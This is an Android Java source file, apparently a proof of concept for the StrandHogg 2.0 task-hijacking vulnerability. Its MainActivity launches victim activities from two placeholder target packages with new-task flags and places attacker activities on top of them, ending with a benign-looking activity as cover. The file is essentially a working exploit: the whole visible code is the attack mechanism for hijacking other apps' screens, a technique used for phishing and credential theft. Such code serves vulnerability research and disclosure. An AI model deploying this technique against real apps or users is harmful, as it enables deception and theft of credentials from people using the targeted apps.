package cn.wrlu.strandhogg2;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {
//    You must change here before your run the PoC,
//    otherwise the application will crash due to the ActivityNotFoundException
    private static String TARGET_PKG_1 = "pkg1";
    private static String TARGET_CLASS_1 = "pkg1.clz1";
    private static String TARGET_PKG_2 = "pkg2";
    private static String TARGET_CLASS_2 = "pkg2.clz2";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent1 = new Intent();
        Intent intent2 = new Intent();
        Intent intent3 = new Intent();
        Intent intent4 = new Intent();
        Intent intent5 = new Intent();
//        Intent 1: The first victim activity, add FLAG_ACTIVITY_NEW_TASK flag
        intent1.setClassName(TARGET_PKG_1, TARGET_CLASS_1);
        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

//        Intent 2: An attacker activity for the first victim activity, no extra flag
        intent2.setClass(this, Attack1Activity.class);

//        Intent 3: The second victim activity, add FLAG_ACTIVITY_NEW_TASK flag
        intent3.setClassName(TARGET_PKG_2, TARGET_CLASS_2);
        intent3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

//        Intent 4: An attacker activity for the second victim activity, no extra flag
        intent4.setClass(this, Attack2Activity.class);

//        Intent 5: The activity with some normal features, add FLAG_ACTIVITY_NEW_TASK flag
        intent5.setClass(this, NormalActivity.class);
        intent5.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Intent[] intents = new Intent[]{
                intent1, intent2, intent3, intent4, intent5
        };
        startActivities(intents);
    }
}
